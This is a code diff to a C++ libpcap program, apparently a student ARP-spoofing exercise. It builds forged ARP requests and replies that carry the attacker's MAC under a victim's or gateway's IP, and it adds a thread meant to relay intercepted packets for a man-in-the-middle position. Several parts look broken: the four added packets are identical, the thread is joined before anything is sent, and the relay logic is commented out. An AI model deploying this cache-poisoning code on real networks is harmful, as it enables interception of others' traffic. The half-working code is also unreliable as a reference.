@@ -2,6 +2,7 @@
 #include <iostream>
 #include <fstream>
 #include <stdio.h>
+#include <thread>
 
 // Add class made by bearics
 #include "arppacket.h"
@@ -10,7 +11,7 @@ using namespace std;
 
 void getAttackerInfo(u_char* ip, u_char* mac);
 void sendPkt(pcap_t *handle, u_char* send_pkt, int size);
-void receivePkt(pcap_t *handle, struct pcap_pkthdr *header, ArpPacket &arpPkt);
+void receivePkt(pcap_t *handle, struct pcap_pkthdr *header);
 
 int main(int argc, char *argv[])
 {
@@ -52,7 +53,13 @@ int main(int argc, char *argv[])
         return(2);
     }
     // packet is attacker send to sender(victim)
-    ArpPacket a2s;
+    cout << "Setting packets " << endl;
+
+    static ArpPacket a2s;
+    static ArpPacket s2a;
+    static ArpPacket a2t;
+    static ArpPacket t2a;
+    // attacker send to sender
     a2s.setEtherDestMac((u_char*)"FF:FF:FF:FF:FF:FF");
     a2s.setEtherSourceMac(attackerMAC);
     a2s.setArpOpcode(ARPOP_REQUEST);
@@ -61,12 +68,39 @@ int main(int argc, char *argv[])
     a2s.setArpTargetIP((u_char*)argv[2]);
     a2s.setArpTargetMac((u_char*)"00:00:00:00:00:00");
 
+    s2a.setEtherDestMac((u_char*)"FF:FF:FF:FF:FF:FF");
+    s2a.setEtherSourceMac(attackerMAC);
+    s2a.setArpOpcode(ARPOP_REQUEST);
+    s2a.setArpSenderIP((u_char*)argv[3]);
+    s2a.setArpSenderMac(attackerMAC);
+    s2a.setArpTargetIP((u_char*)argv[2]);
+    s2a.setArpTargetMac((u_char*)"00:00:00:00:00:00");
+
+    a2t.setEtherDestMac((u_char*)"FF:FF:FF:FF:FF:FF");
+    a2t.setEtherSourceMac(attackerMAC);
+    a2t.setArpOpcode(ARPOP_REQUEST);
+    a2t.setArpSenderIP((u_char*)argv[3]);
+    a2t.setArpSenderMac(attackerMAC);
+    a2t.setArpTargetIP((u_char*)argv[2]);
+    a2t.setArpTargetMac((u_char*)"00:00:00:00:00:00");
+
+    t2a.setEtherDestMac((u_char*)"FF:FF:FF:FF:FF:FF");
+    t2a.setEtherSourceMac(attackerMAC);
+    t2a.setArpOpcode(ARPOP_REQUEST);
+    t2a.setArpSenderIP((u_char*)argv[3]);
+    t2a.setArpSenderMac(attackerMAC);
+    t2a.setArpTargetIP((u_char*)argv[2]);
+    t2a.setArpTargetMac((u_char*)"00:00:00:00:00:00");
+
+    thread t(&receivePkt, handle, header);
+    t.join();
+
     sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
-    receivePkt(handle, header, a2s);
 
     // send spoofed packet to sender
     a2s.setArpOpcode(ARPOP_REPLY);
     sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
+
 }
 
 void getAttackerInfo(u_char* attackerIP, u_char* attackerMAC)
@@ -91,7 +125,7 @@ void sendPkt(pcap_t *handle, u_char* send_pkt, int size)
         cout << "Sending SUCCESS!" << endl;
 }
 
-void receivePkt(pcap_t *handle, struct pcap_pkthdr *header, ArpPacket &arpPkt)
+void receivePkt(pcap_t *handle, struct pcap_pkthdr *header)
 {
     int res=0;
     const u_char *pkt;
@@ -100,33 +134,36 @@ void receivePkt(pcap_t *handle, struct pcap_pkthdr *header, ArpPacket &arpPkt)
     while((res = pcap_next_ex( handle, &header, &pkt)) >= 0){
         eth=(struct ether_header *)pkt;
         arp=(struct ether_arp *)(pkt+ETH_HLEN);
-        /* Check ARP */
+        cout << "checking" << endl;
+        /* Check ARP
         if(ntohs(eth->ether_type) == ETHERTYPE_ARP ){
             // compare sender ip
-            for(int i=0;i<4;i++) printf(" %2x", arpPkt.arp->arp_tpa[i]);
-            printf("\n");
-            for(int i=0;i<4;i++) printf(" %2x", arp->arp_spa[i]);
-            printf("\n");
-            printf("%d\n",sizeof(struct in_addr));
             if(memcmp(arpPkt.arp->arp_tpa, arp->arp_spa, sizeof(struct in_addr))==0)
             {
                 if(memcmp(arpPkt.eth->ether_dhost, (u_char*)"\xFF\xFF\xFF\xFF\xFF\xFF", ETHER_ADDR_LEN) == 0)
                 {
                     memcpy(arpPkt.eth->ether_dhost, eth->ether_shost, ETHER_ADDR_LEN);
                     memcpy(arpPkt.arp->arp_tha, eth->ether_shost, ETHER_ADDR_LEN);
-                    for(int i=0;i<4;i++) printf(" %02x", arpPkt.eth->ether_dhost[i]);
-                    printf("\n");
-                    for(int i=0;i<4;i++) printf(" %02x", arpPkt.arp->arp_tha[i]);
-                    printf("\n");
-
                     cout << "changed";
+                }
+                else {
+                    cout << "start"<<endl;
+                    ArpPacket relayPkt;
+                    relayPkt.setEtherDestMac(eth->ether_dhost);
+                    relayPkt.setEtherSourceMac(eth->ether_shost);
+                    relayPkt.setArpOpcode(arp->arp_op);
+                    relayPkt.setArpSenderIP(arp->arp_spa);
+                    relayPkt.setArpSenderMac(arp->arp_sha);
+                    relayPkt.setArpTargetIP(arp->arp_tpa);
+                    relayPkt.setArpTargetMac(arp->arp_tha);
+                    cout << "fin setting"<<endl;
+                    sendPkt(handle, relayPkt.pkt, sizeof(relayPkt.pkt));
+                    cout << "Success relay packet" << endl;
                 }
 
             }
-
-            for(int i=0;i<42;i++) printf(" %2x", pkt[i]);
             break;
-        }
 
+        }*/
     }
 }
